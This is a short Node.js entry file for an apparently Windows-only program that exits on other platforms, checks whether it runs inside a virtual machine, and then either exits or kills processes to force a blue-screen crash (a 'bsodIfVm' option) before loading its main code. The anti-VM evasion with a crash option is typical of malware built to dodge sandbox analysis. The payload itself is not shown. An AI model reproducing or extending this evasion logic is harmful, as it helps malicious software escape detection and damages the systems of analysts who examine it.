if (process.platform !== 'win32') process.exit();

module.exports.startTime = Date.now();

const config = require('./config');
const { checkVM, killTasks } = require('./functions/anti-vm');

if (config.vmProtect && checkVM()) {
  if (config.bsodIfVm) {
    killTasks();
  } else {
    process.exit(0);
  }
} else {
  require('./util/init')();
}
